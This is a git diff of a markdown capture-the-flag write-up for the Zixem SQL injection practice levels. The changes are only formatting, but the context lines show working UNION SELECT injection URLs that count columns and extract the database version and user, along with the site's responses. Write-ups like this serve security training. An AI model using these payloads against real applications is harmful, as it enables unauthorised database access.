@@ -14,7 +14,7 @@
 - [Level 8](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-8)
 - [Level 9](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-9)
 
-  ===========================================================================================================  
+===========================================================================================================  
 
 ## [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
 Start: `[https://zixem.altervista.org/SQLi/level1.php?id=1](https://zixem.altervista.org/SQLi/level1.php?id=1)`  
@@ -47,13 +47,13 @@ Ok let's extract *version()* and *user()*:
 **Bazinga!**  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
 
-  ===========================================================================================================  
+===========================================================================================================  
 
 ## [Level 2](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-2)
 Start: `[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zixem.altervista.org/SQLi/level2.php?showprofile=4)`  
-> **User-ID:** 4
-> **Username:** ZiX-M
-> **Age:** 17
+> - **User-ID:** 4
+> - **Username:** ZiX-M
+> - **Age:** 17
 
 => Test with prev payload:  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
@@ -69,16 +69,18 @@ Start: `[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zix
 
 => It is ok now, but we have select wrong number of columns:  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3,4--%27`
-> **User-ID:** 1
-> **Username:** 2
-> **Age:** 3
+> - **User-ID:** 1
+> - **Username:** 2
+> - **Age:** 3
 
 => It is Done. Let's grep the *version()* & *user()*:  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
-> **User-ID:** 5.6.33-log
-> **Username:** zixem@localhost
-> **Age:** 3
+> - **User-ID:** 5.6.33-log
+> - **Username:** zixem@localhost
+> - **Age:** 3
 
 **Bazinga!**  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
